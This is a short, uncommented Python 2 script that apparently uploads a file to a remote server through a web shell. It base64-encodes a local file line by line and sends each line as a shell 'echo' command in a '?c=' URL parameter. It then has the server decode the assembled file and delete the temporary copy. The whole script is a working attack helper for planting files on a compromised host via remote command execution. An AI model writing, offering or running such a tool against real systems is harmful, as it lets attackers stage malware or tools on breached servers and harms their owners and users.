import sys
import urllib
import urllib2

endpoint = sys.argv[1]
dest = sys.argv[2]

with open(sys.argv[2], 'r') as fh:
    for line in fh:
        data = line.encode('base64').strip()
        cmd = "echo '{0}' >> tmp.{1}".format(data, dest)
        enccmd = urllib.quote(cmd)
        response = urllib2.urlopen(endpoint + "?c=" + enccmd)
        data = response.read()
        print data

enccmd = urllib.quote("base64 -d tmp.{0} > {0}".format(dest))
response = urllib2.urlopen(endpoint + "?c=" + enccmd)
data = response.read()
print data
enccmd = urllib.quote("rm tmp.{0}".format(dest))
response = urllib2.urlopen(endpoint + "?c=" + enccmd)
data = response.read()
print data
